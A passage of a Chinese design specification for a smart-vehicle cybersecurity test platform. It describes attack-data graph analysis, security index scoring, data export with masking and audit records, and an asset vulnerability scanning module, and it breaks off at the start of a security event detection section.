可以根据个人偏好或特定分析需求选择合适的布局方式。聚类布局有助于展现节点群组关系，力导布局可以显示节点之间的引力斥力关系，同心圆布局有助于突出层级结构，流程图布局适用于展示攻击事件的演变过程。这一功能为用户提供了丰富的图谱呈现选择，满足不同分析场景的需求。</p></li><li><p>系统支持图谱中的节点固定大小，也支持根据数据变化大小。系统允许用户根据需要设置节点的大小，用户可以选择固定节点大小或根据特定数据动态调整节点大小。这一功能使用户能够更加灵活地呈现图谱中节点的信息，根据节点的重要性或其他指标进行直观展示。通过调整节点大小，用户可以更准确地传达攻击事件的关键信息，提升图谱可读性。</p></li><li><p>系统支持图谱中边的颜色设置，用户可以根据需要设置相同颜色，也支持根据复杂攻击设置不同的颜色。系统提供了灵活的图谱边颜色配置功能，用户可以根据自己的审查需求，选择相同的颜色以强调特定关系，或者根据复杂攻击的不同设置不同的颜色以区分攻击类型。这一功能使用户能够更好地定制图谱的外观，更直观地理解复杂的攻击关系。</p></li><li><p>系统支持图谱中节点和边均支持设置展示的标签字段。系统允许用户根据需要设置节点和边的展示标签字段，这样用户可以在图谱中显示关键信息，帮助更直观地理解攻击事件。用户可以根据具体场景，选择展示攻击事件的不同维度信息，提高图谱的信息呈现效果，使用户能够更深入地分析网络安全状况。</p></li><li><p>系统支持图谱分析中对两个节点间不同的边进行聚合展示，实现了边聚合展示功能，这一功能能够在图谱分析中对两个节点间不同的边进行聚合分析和展示。通过这种方式，用户可以快速识别和发现关键的安全威胁和攻击路径，而无需逐一查看每个节点的详细信息。这种聚合展示不仅提高了分析效率，而且为用户提供了更为直观和简洁的安全关联视图。用户可以更好地理解节点之间的复杂关联，有助于深入分析攻击链路和攻击路径。</p></li><li><p>系统支持基于试验任务，生成试验数据统计信息及目录。系统能够根据试验任务生成相应的试验数据统计信息及目录，帮助用户系统管理和整理试验数据。这一功能为用户提供了方便的试验数据管理工具，使用户能够更高效地查找和利用试验数据。</p></li><li><p>系统支持用户按需进行试验数据提取查询等。系统支持用户按需提取和查询试验数据，用户可以根据具体需求灵活选择试验数据，提高数据利用效率。这一功能为用户提供了自主管理试验数据的权利，使用户能够更灵活地运用试验数据进行安全分析和决策。</p></li><li><p>系统支持用户选择数据类型，并采用批量导出方式导出数据，用于进行研究分析。系统提供了灵活的数据导出功能，用户可以根据需求选择特定的数据类型，通过批量导出方式将所需数据导出，以支持进一步的研究和分析工作。这一功能使用户能够方便地获取所需数据，为深入研究网络安全事件提供了有力的支持。在导出数据时，用户可以根据不同的分析目的选择数据的种类，确保导出数据的相关性和针对性。系统支持多种数据类型的导出，包括基础攻击数据、有效攻击数据、复杂攻击数据等，用户可以根据实际需求自由组合选择。批量导出方式能够提高效率，用户可以一次性导出多个数据文件，减少了重复操作的繁琐性，提升了工作效率。导出的数据文件格式多样，系统支持常见的数据格式，如CSV、Excel等，以满足用户不同的分析和处理需求。</p></li><li><p>系统该系统具备高级隐私保护机制，支持采用脱敏算法对导出数据进行脱敏处理。脱敏是一种有效的隐私保护手段，通过将敏感信息替换成虚拟或泛化的数据，确保在导出数据时不泄露真实的敏感信息。此系统为用户提供了脱敏策略的配置选项，用户可以根据实际需求选择合适的脱敏算法和策略。这项功能使得该系统在科研等领域能够安全广泛应用，同时保障了数据的隐私安全。</p></li><li><p>系统为了加强审计管理，该系统支持数据导出记录的详细管理。用户可以查看导出人员、导出时间、导出的数据类型等关键信息，从而形成完整的数据导出记录。这一记录管理功能有助于追溯和审计数据的使用历史，为系统的合规性和安全性提供了有力的支持。通过记录管理，系统管理员可以更好地监控数据的流动，及时发现和应对潜在的风险，提高了系统的安全性和管理效率。</p></li></ol><h4 id="性能实施方案-27"><a href="#性能实施方案-27" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>支持图谱分析展示的关键性能指标之一是系统能够处理并展示高达2000个节点的网络拓扑图谱。这意味着在图谱分析场景下，用户可以同时查看并分析庞大而复杂的网络结构，使其能够更全面地理解网络安全状态和事件发生的上下文。在网络安全领域，特别是在复杂攻击事件的分析中，图谱分析是一种强大的工具，能够可视化展示网络节点之间的关系，揭示攻击路径和漏洞利用情况。而支持2000个节点的图谱分析展示，为用户提供了更广阔的视野，使其能够更深入地挖掘潜在的网络威胁和攻击行为。</li></ol><h4 id="技术实现内容-27"><a href="#技术实现内容-27" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-14"><a href="#方案设计-14" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数为，系统支持基于时间进行攻击统计分析，以热力图呈现攻击趋势。攻击者用户特征分析，目标分析，利用的漏洞分析，利用的工具分析。技术分析，包括复杂攻击链路和基础攻击信息。基于网络流量的基础安全指数计算评估，基于漏洞信息的脆弱安全指数评估，基于攻击行为的威胁安全指数评估。</p><p>综合安全指数评估。根据试验资产、漏洞、攻击数据生成试验统计分析报告。根据试验漏洞和攻击数据生成统计报告。用户自定义选择攻击数据进行图谱方式呈现，图谱筛选器管理，路径查询与展示，图谱统计分析展示，图谱快照管理，内容动态添加。不同图谱布局方式，图谱节点固定大小，边颜色设置，节点和边展示标签字段。图谱分析中两节点间不同边聚合展示。</p><p>基于试验任务生成试验数据统计信息及目录。用户按需进行试验数据提取查询，批量导出数据，脱敏算法处理导出数据，数据导出记录管理。</p><p>性能参数为，支持2000个节点的图谱分析展示。</p><p>在智能汽车网络安全领域，对攻击事件的分析与统计是至关重要的。本系统旨在通过图谱分析技术，提供对攻击数据的深度分析与可视化展示，帮助安全分析师理解攻击者的行为特征、利用的工具和技术，以及攻击目标的脆弱性。系统将支持从数据提取到图谱的动态展示，以及从基础安全指数到综合安全指数的计算评估，为智能汽车网络安全防御提供有力的数据支持。</p><p>攻击统计分析</p><p>时间基攻击统计：支持基于时间进行攻击统计分析，以热力图方式展示攻击趋势。</p><p>用户特征分析：支持攻击者的用户特征分析，包括设备浏览器特征等。</p><p>攻击目标分析：支持攻击者作用的目标分析，包括攻击利用路径、利用的端口、攻击应用等。</p><p>漏洞利用分析：支持攻击者利用的漏洞分析，包括漏洞编号、危险等级、漏洞描述。</p><p>工具利用分析：支持攻击者利用的工具分析，包括恶意文件MD5等。</p><p>技术分析：支持攻击者的技术分析，包括复杂攻击链路和基础攻击信息。</p><p>安全指数计算评估</p><p>基础安全指数：支持基于网络流量的基础安全指数计算评估。</p><p>脆弱安全指数：支持基于漏洞信息的脆弱安全指数计算评估。</p><p>威胁安全指数：支持基于攻击行为的威胁安全指数计算评估。</p><p>综合安全指数：支持基于三维安全指数的综合安全指数计算评估。</p><p>统计报告生成</p><p>试验统计报告：支持根据试验资产、漏洞、攻击数据生成试验统计分析报告。</p><p>漏洞与攻击报告：支持根据试验漏洞和攻击数据生成统计报告。</p><p>图谱分析与展示</p><p>图谱自定义展示：支持用户自定义选择攻击数据进行图谱展示。</p><p>图谱筛选管理：支持基于筛选器管理进行图谱筛选。</p><p>图谱路径查询：支持图谱路径查询与展示。</p><p>图谱统计分析：支持图谱统计分析与展示。</p><p>图谱快照管理：支持图谱快照管理。</p><p>图谱内容动态添加：支持图谱内容的动态添加。</p><p>图谱布局方式：支持不同的图谱布局方式。</p><p>图谱节点大小：支持图谱中的节点固定大小。</p><p>图谱边颜色设置：支持图谱中边的颜色设置。</p><p>图谱标签字段设置：支持设置展示的标签字段。</p><p>图谱边聚合展示：支持图谱边的聚合展示。</p><p>试验数据管理</p><p>试验数据统计目录：支持基于试验任务生成试验数据统计信息及目录。</p><p>试验数据提取查询：支持用户按需进行试验数据提取查询。</p><p>数据批量导出：支持用户选择数据类型批量导出。</p><p>数据脱敏处理：支持对导出数据进行脱敏处理。</p><p>数据导出记录管理：支持数据导出记录管理。</p><p>图谱分析展示能力：支持2000个节点的图谱分析展示。</p><p>本系统提供了一个全面的智能汽车网络安全图谱分析与统计平台，能够帮助安全分析人员深入理解网络攻击的各个方面。通过系统的分析与评估，可以更好地指导智能汽车网络安全防御策略的制定与执行。系统的高性能设计确保了即使在大规模数据面前也能保持流畅的分析与展示能力。通过图谱的可视化展示，复杂的安全数据被转换为直观易懂的信息，极大地提高了安全事件的响应效率和准确性。</p><h5 id="方案介绍-4"><a href="#方案介绍-4" class="headerlink" title="方案介绍"></a>方案介绍</h5><p>安全分析评估模块基于攻击数据（基础攻击、复杂攻击、有效攻击数据）、防守成果数据、情报数据、网络流量数据，结合实验数据、资产数据、漏洞数据，使用规则配置、自主决策方式进行数据分析、对比分析、多维度分析，为确保数据的隐私和安全，该模块提供了数据脱敏功能，同时支持导出数据和记录导出历史。用户可以灵活地将分析结果导出，方便进一步深入研究、分享或归档分析成果。这一功能组合为用户提供了全面而灵活的数据分析与管理手段。同时为了审计管理，数据导出的信息涵盖了数据类型、导出时间、人员等。</p><p>该综合安全态势可视化模块还提供了深入的攻击者分析功能。它支持攻击者的用户特征分析，以帮助用户更好地理解攻击者的身份和特点，其中涵盖但不限于设备和浏览器特征等。同时，该模块还支持攻击者作用的目标分析，包括攻击的利用路径、利用的端口以及攻击应用等方面的信息，从而揭示攻击者的策略和目标。</p><p>此外，综合安全态势可视化模块还具备攻击者利用的漏洞分析功能，包括漏洞描述、危险等级、漏洞编号，有助于安全团队了解攻击者利用的漏洞情况。系统还提供对攻击者使用的工具进行深入分析，涵盖涉及恶意文件的MD5等详细信息。此外，系统还支持对攻击者的技术进行全面分析，涵盖基础攻击信息以及复杂攻击链路的细致解析。</p><p>最后，综合安全态势可视化模块可以通过攻击数据、试验资产、漏洞来产生试验统计分析报告，以及根据试验攻击数据、漏洞产生统计报告，这些报告可供防御方参考，用于系统加固和决策制定。这一系列分析功能有助于深入了解攻击事件的细节，提高网络安全的整体水平。</p><p>评估功能模块数据是基石，该模块支持基于网络流量的基础安全指数计算评估，基于漏洞信息的脆弱安全指数计算评估，以及基于攻击行为的威胁安全指数计算评估。最终，这些评估可以综合为基于基础、脆弱、威胁三维安全指数，为用户提供全面的安全评估。数据的收集包括入侵检测系统（IDS）和入侵防御系统（IPS）的日志、情报数据导入、网络流量数据、实验靶标数据、历史防守成功数据、操作系统数据和应用程序日志数据等。确保数据包括时间戳、源IP地址、目标IP地址、攻击类型、攻击方法等关键信息。</p><p>安全分析评估总体流程图如下所示:</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/66731fd3bb5e90f1a25002f01be85b25.png"></p><p>数据分析方法：</p><ul><li>攻击趋势分析：分析攻击数据的时间趋势，以确定是否存在季节性或周期性的攻击活动。</li><li>攻击来源和目标分析：确定攻击活动的来源和目标，以识别潜在的受攻击系统或网络。</li><li>攻击类型分析：分析不同类型的攻击，例如恶意软件传播、拒绝服务攻击、身份验证尝试等。</li><li>攻击向量分析：确定攻击者使用的攻击向量，例如恶意软件、漏洞利用等。</li><li>受害程度评估：评估攻击的受害程度，包括数据泄露、系统瘫痪、服务不可用等。</li></ul><p>通过分析攻击数据，识别潜在的漏洞或系统弱点，可能导致攻击成功。检查当前的安全策略和控制措施，以确定其有效性和完整性。分析数据可以帮助确定是否需要进一步改进策略。将外部的威胁情报信息、实验靶标数据、防守成功数据与分析结果结合，以提高评估的准确性和深度。这包括黑名单IP地址、已知攻击者情报、漏洞信息等。生成安全评估报告，包括当前的安全状况、发现的漏洞和威胁、建议的改进措施和风险评估。定期根据数据分析进行安全评估，以跟踪安全状况的变化，并根据新的威胁和漏洞不断生成新的评估报告与改进安全策略和控制措施。</p><p>1.数据支撑和存储模块元素：</p><p>数据支撑：该模块提供了与各种数据源连接的接口，包括防火墙、IDS/IPS、日志收集器、防守成果、实验靶标等。用户可以自定义选择攻击数据，其中涵盖了威胁数据、基础攻击数据、脆弱性数据、有效攻击数据、基础设施数据以及复杂攻击数据，以作为知识库库数据用于后续分析。</p><p>数据存储：安全评估模块需要一个存储系统，用于保存采集到的攻击数据以供后续分析。此存储系统还支持图谱内容的动态添加，可增量选择攻击数据添加到图谱中，并能够生成图谱快照，以管理数据的版本。</p><p>2.数据分析和挖掘模块元素：</p><p>攻击分析引擎：这个引擎允许用户可以自由选择攻击数据，并以图谱的形式进行展示，以便进行关联分析研究。它还支持图谱路径查询，用户可以通过选择方向、起始节点以及目标节点来执行路径展示以及查询。此外，它也可以执行图谱统计分析，包括节点出入度统计、关系数量以及节点数量。图谱可自由选择边的颜色，无论是相同颜色还是根据攻击复杂度而异的颜色都可以选择。此外，用户还能够在图谱的节点和边上添加自定义标签字段，以更好地传达关键信息。系统还提供了图谱分析功能，使用户能够将两个节点之间的多个不同边汇聚显示，以简化复杂关系的可视化，使数据更容易理解。在图谱展示中可展示最大可达2100个节点的图谱分析。</p><p>数据报表工具：生成图表、图形和仪表板，以可视化分析结果，同时可展示多种图谱布局，其中有流程图、力导、聚类以及同心圆布局等，以及节点能够通过数据变化大小来展示也可根据固定大小展示。</p><p>可视化列表工具：支持基于筛选器管理的图谱筛选，根据节点和边进行筛选，并生成列表查询，支持导出excel、脱敏、规则配置和生成导出记录。</p><p>统计分析工具：用于执行统计分析，如攻击趋势分析和攻击来源分析，以进一步加深对攻击数据的理解。</p><p>3.威胁情报整合模块元素：</p><p>威胁情报接口：该接口连接外部威胁情报源，如公共威胁情报提供商，用于获取最新的威胁情报数据，例如黑名单IP地址和已知漏洞。这些数据将用于更新数据支撑中的威胁数据。</p><p>威胁情报数据库：存储已知的威胁情报信息，如黑名单IP地址和已知漏洞，以供安全评估模块使用，用于识别威胁。</p><p>4.漏洞识别和脆弱性评估模块元素：</p><p>漏洞探测设备：用于扫描网络中的系统和应用程序，识别已知漏洞。扫描结果将与数据支撑中的漏洞知识数据库进行比对和更新。</p><p>漏洞知识数据库：存储已知漏洞的信息，以便与扫描结果进行比对和更新，以提供更全面的脆弱性评估。</p><p>5.安全评估报告生成模块元素：</p><p>报告生成引擎：利用数据支撑中的攻击数据、漏洞数据和威胁情报数据，生成安全评估报告，包括当前的安全状况、发现的漏洞和威胁、建议的改进措施和风险评估。报告也可以包括图谱方式呈现的分析结果。</p><p>报告模板：可基于试验任务定义报告的格式和内容，以满足用户的需求，包括试验数据统计信息和目录。用户还可以选择查询或选择数据类型并导出数据，采用批量导出方式以供进一步研究分析。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d8bb165c3bac2dba40be12926f6da93f.png"></p><h3 id="资产漏洞探测模块"><a href="#资产漏洞探测模块" class="headerlink" title="资产漏洞探测模块"></a>资产漏洞探测模块</h3><p>资产漏洞探测模块是网络安全体系中的关键组成部分，其主要目标是自动化地识别和评估组织内部资产的安全漏洞，包括硬件设备、软件应用和系统配置等。该模块通过持续扫描和智能分析技术，及时发现和报告潜在的安全弱点，帮助安全团队优先排序风险，制定补救措施，并跟踪漏洞修复进度，从而增强组织的安全防护能力和响应迅速性。</p><h4 id="功能实施方案-28"><a href="#功能实施方案-28" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>系统提供了全面的探测设备管理功能，允许用户对设备进行灵活的新增、修改和删除。通过直观的用户界面，可以轻松更新设备信息，确保设备库始终保持最新和准确的状态，提高了操作的便捷性，同时保障了系统管理的实时性。</p></li><li><p>支持全面的探测设备信息管理，包括设备名称、连接地址、端口、厂商、型号和访问信息等关键属性。通过设备信息管理模块，用户可以轻松查看和更新各个设备的详细信息，确保设备信息精准可靠，有力支持后续的探测任务。</p></li><li><p>为满足快速查询需求，系统提供了强大的条件查询功能。用户可以根据设备的名称、IP、型号等关键信息进行模糊查询，以便快速定位目标设备。这一功能有助于提高工作效率，使用户能够更迅速地找到所需的设备信息，从而更好地支持后续的决策和操作。截图见截图证明。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2d3b4b31dfb87497f91a181efb77050e.jpeg" alt="39e1e3b8a49ac8b21d9a98706a77f122(1"></p></li><li><p>系统具备高效的指令解析功能，能够接收试验探测指令并进行迅速而准确的解析。这确保系统与其他模块的协同工作，有效地支持试验过程中的指令传递和执行。系统会自动解析指令，以确保探测任务按照预定计划得到顺利执行。</p></li><li><p>为支持协同试验，系统提供了先进的探测范围确定功能。系统可以基于IP、网段等信息智能地确定探测任务的范围，并根据具体需求生成相应的探测任务。这一功能保证了系统在协同试验中能够精准地定位探测目标，提高试验的准确性和实用性。</p></li><li><p>系统通过强大的探测任务调度功能，能够接收探测任务控制命令与配置信息，包括任务的开始、停止以及探测范围的配置。连接相应的试验网络，系统确保漏洞探测任务按照预定计划顺利执行，提高了探测任务的可控性，并增强了系统对试验网络的整合能力。</p></li><li><p>系统支持同时连接试验网络与分析网络，实现探测设备与试验之间的自动调度，包括连接建立与数据传输，进行探测与探测结果数据传输。通过智能调度机制，系统能够高效地协调探测设备之间的连接，确保探测与探测结果数据的无缝传输。这一功能提高了系统的实时性和效率，为用户提供更便捷的探测体验。</p></li><li><p>探测完毕后，系统支持将探测数据发送到探测数据管理模块，并具备动态增量更新的特性。这保证探测数据可以实时而有序地进行更新，有效管理大量的探测数据，并提供对数据动态性的灵活支持，满足系统在长期运行中的实际需求。</p></li><li><p>在靶场攻防对抗试验中，系统支持多个队伍私有场景探测的加速优化，可通过增量方式实现探测效率的提高。系统更灵活地应对不同场景的探测需求，优化靶场攻防对抗试验的整体效果，使系统在多队伍协同作战中更为高效和智能。</p></li><li><p>系统提供全面的探测任务记录与状态监控功能，包括试验名称、任务类型以及探测状态等关键信息。通过直观的监控界面，用户可以实时了解探测任务的执行情况，确保任务进展的可视化管理。这一功能为用户提供了全面的探测任务掌控能力，支持用户在需要时做出及时的调整与决策。</p></li><li><p>系统提供了强大的探测结果解析功能，能够对探测结果进行全面解析，生成资产IP、漏洞ID、漏洞分数、漏洞类型、漏洞描述等关键信息。用户可以通过直观的界面查看详细的解析结果，截图展示了系统生成的丰富信息。这一功能有助于用户深入了解每个探测结果，有效支持漏洞管理和安全决策的制定。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/14e6954372a8f98d72f553cabe7341e1.png"></p></li><li><p>系统支持对探测数据进行灵活适配，按照数据标准组织解析成统一的数据格式。这一特性确保系统能够处理各种来源的探测数据，使其符合统一的标准，提高了数据的一致性和可比性。通过数据格式的统一，系统更为灵活地满足不同用户或系统的数据需求，为数据管理提供了更大的便利性。</p></li><li><p>系统提供了探测数据查看管理功能，以列表方式清晰呈现探测信息，能够根据试验任务进行数据查看。用户可以方便地通过直观的界面查看所有探测任务的详细信息，并根据试验任务进行数据查看。这一功能使用户能够轻松了解探测任务的执行情况，实现对探测数据的直观监控与管理。</p></li><li><p>系统支持对探测数据进行条件查询，包括资产IP、漏洞编号、漏洞类型等模糊条件搜索。用户可以通过灵活的查询条件快速定位所需的探测数据，提高了信息检索的效率。这一功能有助于用户迅速定位特定条件下的探测结果，从而更有效地进行后续的漏洞分析和处理。</p></li><li><p>系统具备关联试验环境探测结果数据与知识库中资产漏洞知识的功能，实现信息的全面补全。通过关联不同数据源，系统能够为用户提供更全面的资产漏洞信息，帮助用户更全面地了解安全状况。通过关联数据的自动提取和智能填充，实现对于确实信息的补全。这一功能强化了系统的智能化和信息关联性，为用户提供了更为综合的安全管理支持。</p></li><li><p>系统实现了文件导入方式进行探测结果的批量补全，为用户提供了便捷的数据整合途径，导入数据能够基于关键信息进行去重融合处理。用户可以通过文件导入将包含关键信息的探测结果批量上传至系统，系统会基于关键信息进行去重融合处理，确保导入的数据与系统中已有的信息相互关联，从而实现了对探测结果的批量补全。这一功能显著简化了数据补全的过程，提高了用户处理大量数据的效率。</p></li><li><p>系统支持对文件导入结果进行实时监控，包括成功导入数量、失败导入数量以及失败导入的详细信息。用户通过直观的监控界面可以清晰了解每次导入的情况，包括成功导入的数量以及导入过程中出现的失败情况。这一功能使用户能够随时监测数据导入的质量，及时发现和解决问题，保障了导入数据的准确性和完整性。</p></li><li><p>在数据管理方面，系统提供了多选方式进行批量删除异常或错误数据的功能。用户可以方便地通过多选操作选取需要删除的数据，系统会迅速而准确地执行删除操作，确保数据管理的灵活性和高效性。这一功能不仅节省了用户的时间，还提供了对异常或错误数据进行精准清理的手段，使系统中的数据保持清晰、可靠。</p></li></ol><h4 id="性能实施方案-28"><a href="#性能实施方案-28" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li><p>系统具备强大的性能，支持同时探测30000个漏洞，这一能力通过截图直观展示。系统的高并发探测能力使其能够有效地应对大规模网络中潜在漏洞的检测需求，确保全面、及时的安全监测。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ec1a3f365da0eb7e21cd97b995e26bcb.png"></p></li><li><p>在资产漏洞探测准确率方面，系统表现出色，达到了90%的高准确率。准确率是一个关键性能指标，直接影响到系统的可靠性和实用性。高达90%的资产漏洞探测准确率意味着系统能够在探测过程中较少地产生误报或漏报，提高了漏洞检测的实际可信度。这一性能特征对于确保系统有效地辨识和报告潜在风险至关重要，有助于用户精准地识别和解决网络安全威胁。</p></li></ol><h4 id="技术实现内容-28"><a href="#技术实现内容-28" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-15"><a href="#方案设计-15" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数为，系统支持对探测设备进行管理，探测设备信息管理。探测设备条件查询，接收试验探测指令解析。协同试验拓扑数据确定探测范围，生成探测任务。探测调度接收探测任务控制命令与配置信息。连接试验网络与分析网络，自动调度探测设备进行探测。探测完毕后将探测数据发送到探测数据管理模块，探测数据动态增量更新。靶场攻防对抗试验中多队伍私有场景探测加速优化。探测任务记录及状态监控。探测结果解析，探测数据适配，探测数据查看管理。探测数据条件查询，关联试验环境探测结果数据与知识库中资产漏洞知识。文件导入方式探测结果批量补全，文件导入结果监控。多选方式批量删除异常或错误数据。</p><p>性能参数为，可探测漏洞数量30000个，资产漏洞探测准确率90%。</p><p>本项目旨在开发一套智能汽车网络安全探测设备管理系统，用于高效管理和调度探测设备，以及处理和分析探测数据。该系统将支持设备的基础管理、探测任务的生成与执行、探测数据的接收与解析，并确保探测活动的高效与准确性。通过此系统，用户可以轻松管理探测设备，快速响应试验需求，并将探测结果与知识库数据关联，以提高漏洞探测的准确率。</p><p>探测设备管理</p><p>设备管理操作：支持对探测设备进行新增、修改、删除操作。</p><p>设备信息管理：支持对探测设备信息进行详细管理。</p><p>设备条件查询：支持对探测设备进行名称、IP、型号等模糊查询。</p><p>探测任务处理</p><p>试验探测指令解析：支持接收并解析试验探测指令。</p><p>探测范围确定：协同试验对应拓扑数据确定探测范围。</p><p>探测任务调度：支持探测任务的控制命令与配置信息处理。</p><p>网络连接与数据传输：支持同时连接试验网络与分析网络。</p><p>探测数据传输：支持探测数据的发送与动态增量更新。</p><p>探测效率优化</p><p>多队伍探测优化：支持靶场攻防试验中多队伍的探测加速优化。</p><p>探测任务监控：支持探测任务记录及状态监控。</p><p>探测数据解析与管理</p><p>探测结果解析：支持对探测结果数据进行详细解析。</p><p>探测数据适配：支持探测数据的标准化适配。</p><p>探测数据查看管理：支持探测数据的查看管理。</p><p>探测数据条件查询：支持对探测数据进行条件查询。</p><p>数据补全与融合</p><p>探测结果与知识库关联：支持关联试验环境探测结果与资产漏洞知识。</p><p>批量数据补全：支持文件导入方式进行探测结果批量补全。</p><p>文件导入监控：支持对文件导入结果进行监控。</p><p>异常数据批量删除：支持多选方式进行批量删除异常或错误数据。</p><p>漏洞探测数量：可探测漏洞数量达到30000个。</p><p>探测准确率：资产漏洞探测准确率达到90%。</p><p>通过实施本方案，将提供一个全面的探测设备管理和数据处理平台，以支持智能汽车网络安全的漏洞探测工作。系统的设计考虑到了从设备管理到数据处理的全过程，确保了探测活动的高效性和准确性。此外，系统的优化措施将提高探测效率，减少冗余数据，提高数据分析的质量。通过本系统，用户可以实现对智能汽车网络安全态势的快速评估和响应。</p><h5 id="方案介绍-5"><a href="#方案介绍-5" class="headerlink" title="方案介绍"></a>方案介绍</h5><p>资产漏洞探测模块的目标是实现网络漏洞探测任务的高效管理与执行。它提供了一系列功能，包括探测设备管理，灵活的条件查询，以及探测任务的协同调度和数据管理。</p><p>资产安全漏洞探测旨在识别和修复组织资产（如服务器、网络设备、应用程序等）中的漏洞和弱点，以降低潜在的安全风险。资产探测设备首先会识别组织内部的所有资产，包括服务器、工作站、网络设备、应用程序、数据库等。一旦资产被识别，资产探测设备会对这些资产进行系统性的扫描，以检测已知漏洞和弱点。扫描可以基于已知的漏洞数据库（知识库）进行，将检测到的漏洞进行分类，根据漏洞的严重性和优先级进行评估。通常，漏洞被分为不同的级别（如高、中、低）以便能够优先处理最危险的漏洞。</p><p>首先，该模块允许用户对探测设备进行管理，包括设备的添加、修改和删除。用户可以维护关键设备信息，如访问信息、厂商、设备名称、端口、型号以及连接地址。此外，用户可以轻松地快速找到所需的设备信息，根据设备信息进行条件查询。</p><p>其次，系统支持接收试验探测指令并进行解析。它能够根据协同试验的拓扑数据确定探测范围，生成探测任务，并自动安排探测设备执行漏洞探测，且可探测漏洞数量至少为30000个，准确率不低于90%。系统能够同时连接试验网络和分析网络，智能地管理探测设备与试验之间的连接，确保探测任务的高效执行和结果的及时传输。</p><p>探测数据经过解析后，会被发送到探测数据管理模块，支持动态增量更新，同时还提供了优化靶场攻防对抗试验中多个队伍私有场景的探测速度，以提升效率。用户可以随时监控探测任务的记录和状态，涵盖了探测状态、任务类型以及试验名称。</p><p>一旦探测任务完成，系统支持对探测结果进行解析，生成关于资产IP、漏洞ID、漏洞分数、漏洞类型和漏洞描述的详细信息。探测数据可以按照统一的数据格式进行适配和管理，以便后续的数据查看和分析。用户可以以列表方式查看探测信息，并进行条件查询，以快速定位所需数据。此外，系统还能够关联试验环境的探测结果数据与知识库中的资产漏洞知识，实现信息的完整性。</p><p>对于探测结果的批量补全，用户可以选择使用文件导入方式。导入的数据将根据关键信息进行去重和融合处理，同时提供了监控功能，以便跟踪文件导入结果，包括成功导入数量、失败导入数量和详细的失败导入信息。</p><p>最后，用户还可以通过多选方式轻松批量删除异常或错误数据，以维护数据的质量和整洁性。</p><p>探测任务使用资产探测设备可进行自动化扫描，定期扫描网络和系统，以确保新的漏洞没有被引入，同时还能检测到已知漏洞的修复情况。</p><p>探测任务可生成详细的漏洞报告，包括发现的漏洞、漏洞的描述、影响级别、建议的修复措施以及漏洞的证据。这些报告帮助了解其漏洞情况与修复措施。</p><p>探测任务具有可配置性，可以根据具体的需求进行自定义，同时也能够关联实验结果数据与知识库知识漏洞进行系统集成，以实现自动化响应和修复。</p><p>资产安全漏洞探测由资产管理、探测设备管理、探测任务管理、探测数据管理组成，其组成示意图如下所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/53dc6f1cc5959082e743b9ed2dc07025.png"></p><p>1.探测设备管理：</p><p>提供设备的添加、修改和删除功能。</p><p>管理设备信息，包括名称、连接地址、端口、厂商、型号和访问信息。</p><p>2.探测任务调度：</p><p>解析试验探测指令并生成相应的探测任务。</p><p>支持协同试验对应拓扑数据的探测范围确定。</p><p>自动调度探测设备执行探测任务，包括开始、停止和探测范围的配置。</p><p>3.探测数据管理：</p><p>接收和存储探测完毕后的探测数据。</p><p>支持动态增量更新。</p><p>监控探测任务记录和状态，包括试验名称、任务类型和探测状态。</p><p>4.探测结果解析模块：</p><p>解析探测结果，生成漏洞描述、资产IP、漏洞类型、漏洞分数以及漏洞ID等信息。</p><p>对探测数据进行适配，统一数据格式。</p><p>5.探测数据查看和管理模块：</p><p>提供探测数据的列表查看和条件查询功能，包括资产IP、漏洞编号、漏洞类型等模糊条件搜索。</p><p>支持关联试验环境探测结果数据与知识库中的资产漏洞知识，进行信息补全。</p><p>6.文件导入和数据批量补全：</p><p>支持文件导入方式进行探测结果的批量补全。</p><p>导入数据基于关键信息进行去重和融合处理。</p><p>监控文件导入结果，包括成功导入数量、失败导入数量和失败导入的详细信息。</p><p>7.表单工具：</p><p>用于创建配置自定义表单，该表单支持对数据进行增改查、用于实现资产设备、资产扫描设备的自定义配置实现。</p><p>8.表格工具：</p><p>用于窗配置自定义列表，该表格支持基于数据自定义高级查询、excel导入导出、列表显示等。用于配置资产设备列表、资产扫描设备列表、探测数据列表、探索任务列表功能。</p><p>9.漏洞数据库：</p><p>资产探测设备使用漏洞数据库来比对已知的漏洞。这些数据库包含了各种已知漏洞的详细信息，包括漏洞描述、危害级别、受影响的软件版本等。</p><p>9.主动和被动扫描：</p><p>使用探测任务基于探测设备的安全漏洞扫描可以分为主动和被动两种方式。主动扫描是指主动地发送请求和测试系统以寻找漏洞。被动扫描则是监视系统的通信流量和行为，以检测潜在的问题。</p><p>10.自动化和手动审查：</p><p>使用探测任务基于探测设备的自动化漏洞扫描工具能够快速识别已知漏洞，但可能会产生误报或遗漏一些漏洞。因此，手动审查也是重要的，以深入检查系统，发现新的漏洞或特定于环境的问题。</p><p>11.定期扫描：</p><p>使用探测任务基于探测设备的安全漏洞扫描是一个持续性的过程，应该定期进行，以便捕获新的漏洞和确保已知漏洞已经修复。</p><h3 id="安全事件检测模块"><a href="#安全事件检测模块" class="headerlink" title="安全事件检测模块"></a>安全事件检测模块</h3><h4 id="功能实施方案-29"><a href="#功能实施方案-29" class="headerlink" 